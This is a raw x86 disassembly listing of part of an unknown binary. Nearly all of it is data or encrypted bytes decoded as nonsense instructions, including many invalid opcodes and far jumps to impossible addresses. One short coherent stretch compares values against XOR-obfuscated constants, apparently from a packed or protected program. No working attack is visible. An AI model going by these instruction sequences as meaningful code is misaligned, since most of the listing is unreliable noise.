  4101ef:	xlat   BYTE PTR ds:[ebx]
  4101f0:	ror    DWORD PTR [eax],0xdf
  4101f3:	in     al,0xd8
  4101f5:	in     eax,0xce
  4101f7:	shr    DWORD PTR [esi-0x32330a2f],0xd0
  4101fe:	shl    al,cl
  410200:	sti    
  410201:	mov    edi,0xdfc9ccee
  410206:	in     eax,dx
  410207:	inc    BYTE PTR [ebx]
  410209:	fld    DWORD PTR [ebx]
  41020b:	jecxz  0x4101cf
  41020d:	loop   0x410209
  41020f:	in     eax,0x6
  410211:	les    ecx,FWORD PTR [ecx]
  410213:	out    dx,eax
  410214:	fptan  
  410216:	out    0xbd,eax
  410218:	add    edx,DWORD PTR [ecx+eax*4]
  41021b:	mov    DWORD PTR [ebp-0x10],edx
  41021e:	mov    eax,DWORD PTR [ebp-0x3c]
  410221:	xor    eax,0x75108b5
  410226:	add    eax,0x3272fb
  41022b:	cmp    DWORD PTR [ebp-0x10],eax
  41022e:	je     0x41023e
  410234:	jmp    0x412644
  410239:	jmp    0x412644
  41023e:	mov    eax,DWORD PTR [ebp-0x2c]
  410241:	mov    ecx,DWORD PTR [ebp-0x3c]
  410244:	xor    ecx,0x75108b5
  41024a:	add    ecx,0x3272fb
  410250:	cmp    eax,ecx
  410252:	je     0x4125f9
  410258:	mov    eax,DWORD PTR [ebp-0x44]
  41025b:	mov    ecx,DWORD PTR [ebp-0x24]
  41025e:	movzx  eax,WORD PTR [ecx+eax*2]
  410262:	mov    ecx,DWORD PTR [ebp-0x20]
  410265:	jmp    0x4125ee
  41026a:	push   edi
  41026b:	scas   eax,DWORD PTR es:[edi]
  41026c:	jp     0x410212
  41026e:	bound  esi,QWORD PTR [ebp+esi*2-0x1b035694]
  410275:	xor    BYTE PTR [edi+0x18],bh
  410278:	or     ebx,edi
  41027a:	fimul  DWORD PTR [eax+0x7b]
  41027d:	jnp    0x410266
  41027f:	cwde   
  410280:	jnp    0x4102fd
  410282:	loope  0x410272
  410284:	idiv   BYTE PTR [ebp-0x4c09330b]
  41028a:	mov    ebx,0xc9beb0f1
  41028f:	loop   0x41026c
  410291:	std    
  410292:	icebp  
  410293:	(bad)  
  410295:	mov    edi,0xc302d0f5
  41029a:	cld    
  41029b:	clc    
  41029c:	(bad)  
  41029d:	retf   
  41029e:	fild   WORD PTR [esi]
  4102a0:	or     ch,BYTE PTR [edi-0x34145333]
  4102a6:	into   
  4102a7:	shl    cl,cl
  4102a9:	fcmovnbe st,st(3)
  4102ab:	int3   
  4102ac:	mov    ecx,0xc2bdb5fe
  4102b1:	fcomi  st,st(0)
  4102b3:	shl    eax,0xfc
  4102b6:	ret    
  4102b7:	xlat   BYTE PTR ds:[ebx]
  4102b8:	in     eax,0xde
  4102ba:	lock push es
  4102bc:	into   
  4102bd:	ret    
  4102be:	fisttp DWORD PTR [esi]
  4102c0:	loope  0x41027b
  4102c2:	retf   
  4102c3:	ror    ch,cl
  4102c5:	shr    dh,0xf1
  4102c8:	cmc    
  4102c9:	stc    
  4102ca:	(bad)
  4102cd:	fdivrp st(4),st
  4102cf:	(bad)  
  4102d0:	fsubrp st(1),st
  4102d2:	stc    
  4102d3:	loop   0x4102c6
  4102d5:	faddp  st(2),st
  4102d7:	add    bh,cl
  4102d9:	in     al,0xfd
  4102db:	cld    
  4102dc:	(bad)  
  4102dd:	out    dx,al
  4102de:	or     esp,esi
  4102e0:	out    0xdf,al
  4102e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102e3:	mov    bl,0xea
  4102e5:	imul   bh
  4102e7:	mov    cl,0xc0
  4102e9:	mov    ecx,0xcbcbf0f5
  4102ee:	rcr    ah,cl
  4102f0:	sar    cl,cl
  4102f2:	rcr    edx,1
  4102f4:	lock clc 
  4102f6:	(bad)  
  4102f7:	not    dh
  4102f9:	cld    
  4102fa:	add    BYTE PTR [ecx],al
  4102fc:	les    eax,FWORD PTR [esi]
  4102fe:	push   es
  4102ff:	into   
  410300:	loope  0x4102be
  410302:	mov    bl,0xce
  410304:	shl    bh,0xe5
  410307:	mov    bl,0xfb
  410309:	mov    dh,0xd7
  41030b:	call   esp
  41030d:	jmp    0x4102de
  41030f:	add    edi,ebp
  410311:	cmc    
  410312:	repz pop es
  410314:	test   ebx,0xfcdb05f7
  41031a:	sti    
  41031b:	fiadd  DWORD PTR [ecx]
  41031d:	mov    BYTE PTR ds:0xebe5c009,0xca
  410324:	mov    esi,0xcaacb4ae
  410329:	aad    0xee
  41032b:	hlt    
  41032c:	std    
  41032d:	call   0xed14ccea
  410332:	stc    
  410333:	hlt    
  410334:	ror    ch,cl
  410336:	in     al,dx
  410337:	jecxz  0x410340
  410339:	fxtract 
  41033b:	sti    
  41033c:	retf   
  41033d:	(bad)  
  41033e:	out    0xfa,al
  410340:	adc    eax,edx
  410342:	fucomip st,st(4)
  410344:	iret   
  410345:	mov    ch,0xea
  410347:	enter  0xbbb1,0xb7
  41034b:	stc    
  41034c:	mov    ecx,0xd8edcbda
  410351:	fadd   QWORD PTR [edi]
  410353:	rcl    esp,0xdb
  410356:	sti    
  410357:	rcl    esi,1
  410359:	clc    
  41035a:	ret    0xf407
  41035d:	fcmovb st,st(2)
  41035f:	in     al,0xc4
  410361:	retf   
  410362:	test   ebx,0xcdc8e4f2
  410368:	enter  0xe6e4,0xe8
  41036c:	retf   0xf0ed
  41036f:	shl    esi,1
  410371:	hlt    
  410372:	std    
  410373:	out    0xdc,eax
  410375:	sti    
  410376:	(bad)  
  410377:	mov    esp,0xdafac2e5
  41037c:	(bad)  
  41037d:	inc    edx
  41037f:	or     esp,edx
  410381:	ret    
  410382:	retf   0xd3af
  410385:	ret    0xe0cd
  410388:	xlat   BYTE PTR ds:[ebx]
  410389:	iret   
  41038a:	(bad)  
  41038b:	cli    
  41038c:	aad    0xed
  41038e:	in     al,0xba
  410390:	leave  
  410391:	in     al,dx
  410392:	int3   
  410393:	repz fdivr QWORD PTR [esp+eax*8-0x21819fe]
  41039b:	paddd  mm4,mm2
  41039e:	lds    edx,FWORD PTR [edx]
  4103a0:	jmp    0xe1f5:0xddc7e6c1
  4103a7:	iret   
  4103a8:	retf   
  4103a9:	in     eax,0xda
  4103ab:	mov    edi,0xd1d9ffc8
  4103b0:	mov    al,0xd6
  4103b2:	ret    0xdfe3
  4103b5:	add    bh,ch
  4103b7:	loopne 0x4103af
  4103b9:	retf   
  4103ba:	sti    
  4103bb:	jmp    0x4103a7
  4103bd:	jecxz  0x4103b3
  4103bf:	or     al,BYTE PTR [eax]
  4103c1:	repz (bad) 
  4103c3:	sar    BYTE PTR [esi-0x302b170a],cl
  4103c9:	repnz clc 
  4103cb:	aad    0xb0
  4103cd:	xlat   BYTE PTR ds:[ebx]
  4103ce:	fsub   st(7),st
  4103d0:	add    esp,ecx
  4103d2:	add    ch,bh
  4103d4:	rcl    edx,cl
  4103d6:	(bad)
  4103d9:	jmp    0x4103b3
  4103db:	div    esi
  4103dd:	add    bh,bl
  4103df:	push   cs
  4103e0:	jmp    0x4103c1
  4103e2:	mov    cl,0xf2
  4103e4:	shl    cl,1
  4103e6:	in     eax,0xb0
  4103e8:	out    0xe4,eax
  4103ea:	(bad)
  4103ed:	cli    
  4103ee:	(bad)  
  4103ef:	fild   WORD PTR [ebx]
  4103f1:	enter  0xd8f9,0xdf
  4103f5:	loope  0x4103dd
  4103f7:	fcomi  st,st(4)
  4103f9:	out    0xd4,eax
  4103fb:	out    dx,al
  4103fc:	sti    
  4103fd:	(bad)  
  4103ff:	or     cl,cl
  410401:	lods   al,BYTE PTR ds:[esi]
  410402:	mov    esp,0xecf6ebdc
  410407:	int3   
  410408:	in     al,0xe0
  41040a:	stc    
  41040b:	in     al,0xec
  41040d:	fnstsw WORD PTR [ebx-0x4121362e]
  410413:	stc    
  410414:	int    0xda
  410416:	idiv   dl
  410418:	in     eax,0xda
  41041a:	out    dx,eax
  41041b:	add    bl,ch
  41041d:	in     eax,dx
  41041e:	inc    BYTE PTR ds:0xe2b8b3e3
  410424:	lods   eax,DWORD PTR ds:[esi]
  410425:	retf   
  410426:	loope  0x41041f
  410428:	aam    0xe1
  41042a:	lock sar dh,cl
  41042d:	fst    st(2)
  41042f:	(bad)  
  410431:	sar    BYTE PTR [ecx-0x2c292b2b],cl
  410437:	repnz repnz push es
  41043a:	out    0xee,eax
  41043c:	imul   cl
  41043e:	out    dx,al
  41043f:	add    bh,ch
  410441:	out    0xe4,al
  410443:	test   eax,0xb3f5d5eb
  410448:	mov    cl,0xc9
  41044a:	(bad)  
  41044b:	out    0xd2,eax
  41044d:	out    dx,eax
  41044e:	cld    
  41044f:	retf   
  410450:	lock stc 
  410452:	aad    0xd6
  410454:	rcl    dh,cl
  410456:	mov    edx,0x8d109d3
  41045b:	retf   
  41045c:	clc    
  41045d:	fmul   st(7),st
  41045f:	int    0xa
  410461:	mov    bl,0xbf
  410463:	les    esi,FWORD PTR [ecx-0x1824434f]
  410469:	aad    0xf3
  41046b:	sar    BYTE PTR [edx-0xb2c1718],1
  410471:	in     al,dx
  410472:	hlt    
  410473:	in     eax,dx
  410474:	rcr    ecx,cl
  410476:	(bad)  
  410477:	(bad)  
  410479:	sti    
  41047a:	shr    eax,0xf4
  41047d:	fild   DWORD PTR [esi+ebp*8]
  410480:	jmp    0xec01f33e
  410485:	jecxz  0x41047b
  410487:	repz mov ebx,0xf4c7fbf2
  41048d:	jmp    0xd1d6:0xf3cad2d4
  410494:	std    
  410495:	fiadd  WORD PTR [edi]
  410497:	loopne 0x41047a
  410499:	(bad)  
  41049a:	out    0xf4,eax
  41049c:	in     eax,0xc
  41049e:	add    eax,0xe0ecfccd
  4104a3:	out    0xf5,eax
  4104a5:	aad    0xce
  4104a7:	ret    
  4104a8:	rcl    esi,0xce
  4104ab:	in     al,0xfb
  4104ad:	mov    ch,0xcd
  4104af:	push   esp
  4104b1:	sti    
  4104b2:	(bad)  
  4104b3:	out    dx,al
  4104b4:	xlat   BYTE PTR ds:[ebx]
  4104b5:	out    0x3,al
  4104b7:	rol    BYTE PTR [ecx],1
  4104b9:	fld1   
  4104bb:	(bad)  
  4104bd:	add    esi,ecx
  4104bf:	fsubp  st(0),st
  4104c1:	jmp    0xf107eebd
  4104c6:	lock retf 0xc4e6
  4104ca:	out    0xda,eax
  4104cc:	mov    bh,0xb3
  4104ce:	call   0xf83bc3ca
  4104d3:	rcr    esi,0xd6
  4104d6:	rol    DWORD PTR ds:0xd9d901c4,cl
  4104dc:	mov    BYTE PTR [ecx],0xfa
  4104df:	push   cs
  4104e0:	stc    
  4104e1:	mov    bl,0xeb
  4104e3:	mov    bl,0xd7
  4104e5:	retf   0xf3e8
  4104e8:	cmc    
  4104e9:	xlat   BYTE PTR ds:[ebx]
  4104ea:	clc    
  4104eb:	imul   esi
  4104ed:	in     eax,dx
  4104ee:	(bad)  
  4104ef:	mov    cl,0xb4
  4104f1:	add    bh,dh
  4104f3:	rcl    ecx,cl
  4104f5:	aad    0xf5
  4104f7:	(bad)  
  4104f8:	shl    ecx,1
  4104fa:	sti    
  4104fb:	out    dx,al
  4104fc:	jmp    0x4104da
  4104fe:	(bad)  
  4104ff:	les    eax,FWORD PTR [eax]
  410501:	jmp    0xacc2:0xb2d5cead
  410508:	hlt    
  410509:	aam    0xd9
  41050b:	mov    edx,0xe3fbdbf2
  410510:	(bad)  
  410512:	pop    es
  410513:	mov    ecx,0xda05fcc7
  410518:	add    eax,0xd5e5e5dd
  41051d:	aam    0xe7
  41051f:	out    0xed,eax
  410521:	mov    esp,0xedacefd7
  410526:	stos   BYTE PTR es:[edi],al
  410527:	mov    dh,0xe4
  410529:	out    0xf8,eax
  41052b:	in     al,dx
  41052c:	fcmovbe st,st(0)
  41052e:	idiv   DWORD PTR [eax-0x5101613]
  410534:	into   
  410535:	pop    es
  410536:	in     al,dx
  410537:	(bad)  
  410539:	jmp    0x410538
  41053b:	push   es
  41053c:	into   
  41053d:	add    DWORD PTR [edx],eax
  41053f:	jmp    0xf6b2:0xe1eac003
  410546:	(bad)  
  410547:	int    0xd9
  410549:	int3   
  41054a:	(bad)  
  41054b:	int    0xba
  41054d:	retf   0xf5f6
  410550:	add    DWORD PTR [ecx-0x211c1ff9],edi
  410556:	int3   
  410557:	add    eax,0xe605e3f6
  41055c:	loopne 0x410568
  41055e:	std    
  41055f:	or     esi,ebx
  410561:	int3   
  410562:	test   al,0xc0
  410564:	in     eax,dx
  410565:	into   
  410566:	ret    
  410567:	lods   eax,DWORD PTR ds:[esi]
  410568:	mov    bl,0xd3
  41056a:	les    esi,FWORD PTR [eax-0x462e3208]
  410570:	cli    
  410571:	in     al,dx
  410572:	jecxz  0x410544
  410574:	cld    
  410575:	aam    0xf4
  410577:	mov    ecx,0xc1d6e4f5
  41057c:	fmul   st(0),st
  41057e:	aam    0xec
  410580:	icebp  
  410581:	mov    esi,0xb7d6ddc2
  410586:	(bad)  
  410587:	aad    0xc1
  410589:	mov    dh,0xfa
  41058b:	int    0xef
  41058d:	mov    eax,0xf8d5bbf6
  410592:	out    dx,al
  410593:	add    bl,ah
  410595:	sar    BYTE PTR [esi+0x3e1deeb],cl
  41059b:	(bad)  
  41059c:	jmp    0x410567
  41059e:	out    0x13,al
  4105a0:	or     DWORD PTR [edi-0x83f202f],esp
  4105a6:	into   
  4105a7:	aad    0xcf
  4105a9:	shl    edx,1
  4105ab:	(bad)  
  4105ac:	(bad)  
  4105ad:	cld    
  4105ae:	sti    
  4105af:	mov    ebx,0xf7d1cfd0
  4105b4:	(bad)  
  4105b5:	xlat   BYTE PTR ds:[ebx]
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	mov    ecx,0x4ffd5e0
  4105bc:	inc    DWORD PTR [edi+eiz*8]
  4105bf:	(bad)
  4105c2:	out    0xbf,al
  4105c4:	out    0xd5,al
  4105c6:	jmp    0xe50ee1ab
  4105cb:	mov    eax,0xf6efe4fb
  4105d0:	aad    0xdf
  4105d2:	rcl    edi,cl
  4105d4:	add    dl,bh
  4105d6:	lock in al,0xfb
  4105d9:	add    bl,al
  4105db:	fsubp  st(7),st
  4105dd:	pop    es
  4105de:	hlt    
  4105df:	loopne 0x4105e0
  4105e1:	mov    ecx,0xe6c8b2de
  4105e6:	lock ror ebx,cl
  4105e9:	cmc    
  4105ea:	fbstp  TBYTE PTR [esi-0x4b014410]
  4105f0:	out    dx,al
  4105f1:	iret   
  4105f2:	not    bh
  4105f4:	add    ch,cl
  4105f6:	repz loop 0x4105d6
  4105f9:	loope  0x4105c5
  4105fb:	fld    st(7)
  4105fd:	aam    0x4
  4105ff:	or     cl,cl
  410601:	loopne 0x4105db
  410603:	fsubrp st(2),st
  410605:	scas   eax,DWORD PTR es:[edi]
  410606:	mov    cl,0xc7
  410608:	jmp    0xad34d2e0
  41060d:	(bad)  
  41060f:	rcl    esp,cl
  410611:	xlat   BYTE PTR ds:[ebx]
  410612:	add    bh,BYTE PTR [ebp-0x432e0441]
  410618:	or     ecx,DWORD PTR [eax]
  41061a:	cli    
  41061b:	cld    
  41061c:	out    0xff,eax
  41061e:	add    al,0x12
  410620:	repnz int 0xf3
  410623:	mov    bh,0xe8
  410625:	rcl    esp,0xf1
  410628:	in     al,0xe5
  41062a:	mov    bh,0xd1
  41062c:	(bad)  
  41062d:	aam    0xdc
  41062f:	rol    DWORD PTR [ecx],cl
  410631:	iret   
  410632:	shr    esi,cl
  410634:	loopne 0x41062b
  410636:	rol    DWORD PTR [eax],0xc6
  410639:	std    
  41063a:	fcmovu st,st(5)
  41063c:	(bad)  
  41063d:	(bad)  
  41063e:	fcmovne st,st(0)
  410640:	adc    edi,DWORD PTR [ecx+ebp*8-0x23334843]
  410647:	mov    ebx,0xe4f4b7f0
  41064c:	in     al,0xf9
  41064e:	iret   
  41064f:	mov    ecx,0xf803bfb0
  410654:	push   es
  410655:	(bad)  
  410657:	mov    esp,0x6e6dec4
  41065c:	add    cl,bl
  41065e:	adc    ebp,ebp
  410660:	or     DWORD PTR [edi-0xd36083c],esp
  410666:	sti    
  410667:	(bad)  
  410668:	icebp  
  410669:	mov    bl,0xbb
  41066b:	in     al,dx
  41066c:	mov    ecx,0xf3fdb5fc
  410671:	iret   
  410672:	in     eax,dx
  410673:	sar    ebp,1
  410675:	imul   ah
  410677:	retf   
  410678:	add    esp,edi
  41067a:	lock fcomi st,st(4)
  41067d:	or     al,0x13
  41067f:	(bad)  
  410681:	shr    dh,1
  410683:	int    0xeb
  410685:	scas   eax,DWORD PTR es:[edi]
  410686:	mov    dl,0xcf
  410688:	in     eax,0xf3
  41068a:	mov    cl,0xb8
  41068c:	hlt    
  41068d:	mov    ebp,0xdffcc9f4
  410692:	hlt    
  410693:	mov    esp,0x5ec07cc
  410698:	faddp  st(1),st
  41069a:	loopne 0x41067d
  41069c:	inc    DWORD PTR [edi]
  41069e:	loope  0x41069b
  4106a0:	retf   
  4106a1:	jecxz  0x410652
  4106a3:	icebp  
  4106a4:	(bad)  
  4106a6:	out    0xd2,al
  4106a8:	sti    
  4106a9:	in     eax,0xd0
  4106ab:	clc    
  4106ac:	(bad)  
  4106ae:	(bad)  
  4106af:	bnd ret 0xf2b9
  4106b3:	fcomi  st,st(3)
  4106b5:	inc    BYTE PTR [edx]
  4106b7:	dec    BYTE PTR [ebx]
  4106b9:	cmc    
  4106ba:	cmc    
  4106bb:	shr    dh,0xf8
  4106be:	sti    
  4106bf:	ror    DWORD PTR [edi],cl
  4106c1:	iret   
  4106c2:	shl    bh,cl
  4106c4:	(bad)  
  4106c5:	aad    0xeb
  4106c7:	mov    ch,0xcf
  4106c9:	sar    dl,1
  4106cb:	fcmovu st,st(2)
  4106cd:	rcl    esi,cl
  4106cf:	cli    
  4106d0:	rcr    ebp,1
  4106d2:	add    edi,esp
  4106d4:	lock std 
  4106d6:	int3   
  4106d7:	aam    0xd7
  4106d9:	out    0xc1,eax
  4106db:	add    al,0xe
  4106dd:	push   cs
  4106de:	add    al,0xd
  4106e0:	or     al,0xe1
  4106e2:	(bad)
  4106e6:	(bad)  
  4106e7:	shl    ah,0xd8
  4106ea:	cli    
  4106eb:	out    0xcc,eax
  4106ed:	mov    esi,0xddf5c3da
  4106f2:	cli    
  4106f3:	mov    esi,0xe1c2d4ee
  4106f8:	lds    edi,FWORD PTR [edi-0x180a1d07]
  4106fe:	cld    
  4106ff:	iret   
  410700:	sar    BYTE PTR [eax+esi*4-0x233d1c18],cl
  410707:	cmc    
  410708:	(bad)  
  410709:	repz mov ch,0xff
  41070c:	mov    esi,0xddb5bbee
  410711:	enter  0xb9dc,0xee
  410715:	in     al,dx
  410716:	cli    
  410717:	repz cmc 
  410719:	add    eax,edi
  41071b:	out    dx,eax
  41071c:	stc    
  41071d:	in     al,dx
  41071e:	into   
  41071f:	int3   
  410720:	std    
  410721:	stos   BYTE PTR es:[edi],al
  410722:	loopne 0x4106e5
  410724:	out    dx,al
  410725:	scas   eax,DWORD PTR es:[edi]
  410726:	ret    0xd5e2
  410729:	mov    bh,0xe8
  41072b:	imul   BYTE PTR [ebp+esi*4-0x2801fd47]
  410732:	add    edx,ebx
  410734:	out    dx,al
  410735:	dec    DWORD PTR [ebx]
  410737:	in     eax,0xe7
  410739:	add    al,0xc2
  41073b:	stc    
  41073c:	in     eax,dx
  41073d:	aam    0xcd
  41073f:	stc    
  410740:	in     al,0xc3
  410742:	div    DWORD PTR [edx-0x3c4a372b]
  410748:	int    0xfa
  41074a:	fbstp  TBYTE PTR [esi-0x2e323a34]
  410750:	int3   
  410751:	fild   DWORD PTR [ecx]
  410753:	int3   
  410754:	add    dh,cl
  410756:	sar    BYTE PTR [ebp+0x7fef1f6],0xc8
  41075d:	fmul   st(2),st
  41075f:	sti    
  410760:	fild   QWORD PTR [edi-0x1a321c2e]
  410766:	hlt    
  410767:	sti    
  410768:	xlat   BYTE PTR ds:[ebx]
  410769:	test   bh,0xcb
  41076c:	lods   al,BYTE PTR ds:[esi]
  41076d:	in     eax,0xcc
  41076f:	aad    0xe2
  410771:	(bad)  
  410773:	add    al,bh
  410775:	sti    
  410776:	int3   
  410777:	jecxz  0x41077e
  410779:	fld    DWORD PTR [ecx]
  41077b:	rol    al,0xf
  41077e:	out    dx,eax
  41077f:	push   cs
  410780:	(bad)  
  410781:	jmp    0xc0f4ea57
  410786:	stos   BYTE PTR es:[edi],al
  410787:	enter  0xc5ea,0xf7
  41078b:	lods   eax,DWORD PTR ds:[esi]
  41078c:	retf   0xd4d0
  41078f:	fsub   st(6),st
  410791:	add    esi,ebx
  410793:	loope  0x410761
  410795:	add    al,0xc5
  410797:	ret    0xfbe6
  41079a:	retf   
  41079b:	in     al,0xfb
  41079d:	or     eax,0xe70cf9e0
  4107a2:	(bad)  
  4107a4:	in     al,dx
  4107a5:	stos   DWORD PTR es:[edi],eax
  4107a6:	mov    dl,0xcf
  4107a8:	sti    
  4107a9:	mov    dl,0xef
  4107ab:	(bad)  
  4107ac:	mov    ah,0xfc
  4107ae:	call   0xe409e66f
  4107b3:	out    dx,al
  4107b4:	(bad)  
  4107b6:	int3   
  4107b7:	shl    ebx,cl
  4107b9:	(bad)  
  4107ba:	ror    ecx,0xb
  4107bd:	inc    DWORD PTR [ebx]
  4107bf:	leave  
  4107c0:	add    cl,ch
  4107c2:	jmp    0x410795
  4107c4:	lods   eax,DWORD PTR ds:[esi]
  4107c5:	test   ecx,0xedd8acca
  4107cb:	div    DWORD PTR [eax+esi*8-0x270b4443]
  4107d2:	mov    esi,0xf1c3fbec
  4107d7:	add    edi,DWORD PTR [eax-0x1e2b0bf7]
  4107dd:	inc    DWORD PTR [ebx]
  4107df:	cld    
  4107e0:	adc    ch,dh
  4107e2:	loope  0x4107c0
  4107e4:	mov    ebp,0xcbb7adf2
  4107e9:	shl    DWORD PTR [esi-0x15314a46],0xd2
  4107f0:	std    
  4107f1:	mov    esi,0xe1edc2f7
  4107f6:	rcr    cl,0xfa
  4107f9:	add    al,BYTE PTR [esi]
  4107fb:	shr    ebx,0xd8
  4107fe:	int    0xc
  410800:	int    0xdc
  410802:	retf   
  410803:	out    dx,al
  410804:	in     al,0xef
  410806:	out    0xf4,al
  410808:	out    0xcd,al
  41080a:	shl    BYTE PTR [eax-0x30363035],0xd7
  410811:	fsubr  st,st(5)
  410813:	std    
  410814:	mov    esi,0xe3d602bc
  410819:	or     DWORD PTR [esi-0x20620f9],edi
  41081f:	(bad)  
  410820:	in     al,0xd9
  410822:	in     eax,0xe2
  410824:	lock int 0xdc
  410827:	retf   
  410828:	retf   0xf2af
  41082b:	mov    al,0xfd
  41082d:	mov    esi,0xd5b9c9d0
  410832:	test   BYTE PTR [eax],0xe2
  410835:	in     eax,dx
  410836:	or     esp,esp
  410838:	in     eax,0xc7
  41083a:	shl    ebp,0xce
  41083d:	out    0x9,eax
  41083f:	repz out 0xe6,al
  410842:	enter  0xa8c3,0xad
  410846:	enter  0xefe6,0xee
  41084a:	dec    ebp
  41084c:	iret   
  41084d:	(bad)  
  41084f:	add    ch,cl
  410851:	jmp    0xe5fdc236
  410856:	fld    st(5)
  410858:	shl    cl,1
  41085a:	add    eax,0xe2040902
  41085f:	or     BYTE PTR [ebx],dl
  410861:	icebp  
  410862:	shl    edx,0xb0
  410865:	mov    bl,0xee
  410867:	repnz repz out dx,eax
  41086a:	leave  
  41086b:	mul    ah
  41086d:	sti    
  41086e:	jmp    0xf21fc16d
  410873:	faddp  st(2),st
  410875:	sti    
  410876:	mov    ebp,0xd8f803c5
  41087b:	shl    al,0xff
  41087e:	out    0xce,al
  410880:	retf   0xb3e5
  410883:	fdivrp st(6),st
  410885:	stos   DWORD PTR es:[edi],eax
  410886:	aad    0xc8
  410888:	(bad)
  41088b:	rcr    cl,cl
  41088d:	jmp    0x410848
  41088f:	jmp    0x410854
  410891:	int    0xdc
  410893:	loope  0x410861
  410895:	sar    ah,0xfd
  410898:	rcr    eax,1
  41089a:	cli    
  41089b:	out    dx,eax
  41089c:	add    edi,ebp
  41089e:	add    al,0xde
  4108a0:	jmp    0xc61fd078
  4108a5:	aad    0xaa
  4108a7:	aam    0xc6
  4108a9:	(bad)  
  4108aa:	mov    dh,0xca
  4108ac:	repz call 0xd804d481
  4108b2:	enter  0xdeec,0xbf
  4108b6:	cmc    
  4108b7:	(bad)  
  4108b8:	fprem1 
  4108ba:	(bad)
  4108bd:	fadd   st(6),st
  4108bf:	loop   0x4108af
  4108c1:	in     eax,0xc6
  4108c3:	out    dx,al
  4108c4:	jmp    0x4108b5
  4108c6:	scas   al,BYTE PTR es:[edi]
  4108c7:	in     eax,dx
  4108c8:	in     al,dx
  4108c9:	out    0xf5,eax
  4108cb:	iret   
  4108cc:	in     al,0xfe
  4108ce:	(bad)  
  4108cf:	repnz xlat BYTE PTR ds:[ebx]
  4108d1:	add    ebp,ebp
  4108d3:	sti    
  4108d4:	ret    
  4108d5:	sar    DWORD PTR [ebx+esi*8-0x272529fa],1
  4108dc:	add    esp,ebp
  4108de:	fist   DWORD PTR [ebx]
  4108e0:	cld    
  4108e1:	loope  0x4108aa
  4108e3:	in     al,dx
  4108e4:	scas   eax,DWORD PTR es:[edi]
  4108e5:	lods   al,BYTE PTR ds:[esi]
  4108e6:	(bad)  
  4108e7:	jmp    0x4108e0
  4108e9:	(bad)  
  4108eb:	repnz icebp 
  4108ed:	hlt    
  4108ee:	les    edi,FWORD PTR [edx+edi*8-0x2a3f0d0f]
  4108f5:	faddp  st(6),st
  4108f7:	lock out 0x5,eax
  4108fa:	out    0xc5,eax
  4108fc:	or     eax,0xf306c9ec
  410901:	out    0xc7,eax
  410903:	loop   0x4108fb
  410905:	imul   eax
  410907:	lods   eax,DWORD PTR ds:[esi]
  410908:	repz in eax,dx
  41090a:	into   
  41090b:	mov    eax,0xd003ead6
  410910:	mov    esi,0xbc00d600
  410915:	mov    BYTE PTR [ebx],0x2
  410918:	out    0xc1,al
  41091a:	loopne 0x4108e3
  41091c:	aad    0x5
  41091e:	fadd   DWORD PTR [edi]
  410920:	clc    
  410921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410922:	in     al,0xd2
  410924:	retf   0xe8e0
  410927:	sar    dl,1
  410929:	int3   
  41092a:	clc    
  41092b:	lds    esi,FWORD PTR [eax-0x47321c0b]
  410931:	leave  
  410932:	in     al,dx
  410933:	push   edx
  410935:	fadd   DWORD PTR [edi]
  410937:	or     al,BYTE PTR [ebx]
  410939:	push   es
  41093a:	out    0xf,eax
  41093c:	(bad)  
  41093d:	jmp    0xa7541750
  410942:	mov    ebp,0xf2afa4e0
  410947:	jmp    0xf8d3:0xcbb2d2f2
  41094e:	jmp    0xdfd1:0xbd03d8ce
  410955:	ret    0xf5c2
  410958:	retf   
  410959:	(bad)  
  41095a:	xlat   BYTE PTR ds:[ebx]
  41095b:	iret   
  41095c:	(bad)  
  41095d:	int    0x5
  41095f:	std    
  410960:	int    0xc6
  410962:	mov    bl,0xdc
  410964:	mov    al,0xe0
  410966:	shr    eax,0xf0
  410969:	int    0xb6
  41096b:	fdivr  DWORD PTR [eax-0x30214b0b]
  410971:	jmp    0xf502dc3e
  410976:	add    ecx,edi
  410978:	shl    al,0xeb
  41097b:	(bad)  
  41097c:	add    eax,0x801eee2
  410981:	icebp  
  410982:	mov    ebp,0xc3cec5bc
  410987:	fcmovnbe st,st(6)
  410989:	mov    ch,0xed
  41098b:	mov    edi,0xcff1eadd
  410990:	std    
  410991:	(bad)  
  410992:	xlat   BYTE PTR ds:[ebx]
  410993:	rol    DWORD PTR ds:0x7dd0bc1,0xd8
  41099a:	out    0xee,al
  41099c:	inc    bl
  41099e:	loope  0x4109a7
  4109a0:	(bad)  
  4109a1:	out    0xcf,eax
  4109a3:	ret    
  4109a4:	lds    ebp,FWORD PTR [esi-0xb4f0435]
  4109aa:	out    dx,eax
  4109ab:	lods   eax,DWORD PTR ds:[esi]
  4109ac:	out    0xf4,al
  4109ae:	out    dx,eax
  4109af:	call   ecx
  4109b1:	repnz jecxz 0x41099a
  4109b4:	fld    QWORD PTR [esi]
  4109b6:	loop   0x4109ba
  4109b8:	stc    
  4109b9:	add    cl,BYTE PTR [edx]
  4109bb:	retf   
  4109bc:	clc    
  4109bd:	pand   mm0,mm4
  4109c0:	(bad)  
  4109c1:	into   
  4109c2:	out    0xc8,eax
  4109c4:	mov    esp,0xbab7f0ab
  4109c9:	aam    0xb7
  4109cb:	fidivr DWORD PTR [edi-0x374b2142]
  4109d1:	loop   0x410991
  4109d3:	lock repz sar BYTE PTR [esi-0x21061d20],0xfe
  4109dc:	(bad)  
  4109dd:	fsqrt  
  4109df:	loopne 0x4109b0
  4109e1:	enter  0xc5be,0xb1
  4109e5:	mov    dl,0xb4
  4109e7:	loop   0x4109d2
  4109e9:	iret   
  4109ea:	retf   
  4109eb:	icebp  
  4109ec:	(bad)  
  4109ee:	enter  0xedbc,0xf5
  4109f2:	loop   0x4109e8
  4109f4:	(bad)  
  4109f5:	cmc    
  4109f6:	fdivp  st(7),st
  4109f8:	rol    BYTE PTR [eax*1+0x207c6cf],cl
  4109ff:	out    dx,al
  410a00:	repz shl eax,0xc4
  410a04:	iret   
  410a05:	iret   
  410a06:	int    0xe4
  410a08:	mov    dh,0xf2
  410a0a:	(bad)  
  410a0b:	aam    0xbb
  410a0d:	in     eax,dx
  410a0e:	cmc    
  410a0f:	cld    
  410a10:	iret   
  410a11:	rcl    ebx,1
  410a13:	cld    
  410a14:	xlat   BYTE PTR ds:[ebx]
  410a15:	loopne 0x4109de
  410a17:	fnstcw WORD PTR [eax+ebx*8-0x3c121418]
  410a1e:	fild   DWORD PTR ds:0xb2b1cd11
  410a24:	mov    dl,0xb2
  410a27:	in     al,dx
  410a28:	in     eax,0xe1
